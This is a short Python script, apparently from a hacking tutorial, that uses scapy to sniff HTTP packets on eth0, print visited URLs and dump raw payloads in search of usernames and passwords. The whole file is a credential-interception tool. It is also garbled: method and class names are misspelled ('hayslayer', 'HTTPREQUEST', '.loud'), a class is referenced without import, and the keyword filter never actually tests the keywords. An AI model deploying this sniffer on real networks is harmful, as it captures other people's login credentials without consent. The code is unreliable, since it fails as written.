#!/usr/bin/env python
import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def process_sniffed_packet(packet):
    if packet.hayslayer(http.HTTPREQUEST):
        url = packet[http.HTTPRequest].Host + packet[HTTPRequest].path
        print(url)

        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].loud
            keywords = ["Username", "User", "login", "Password", "Pass"]
            for keyword in keywords:
                print(load)
                break



sniff("eth0")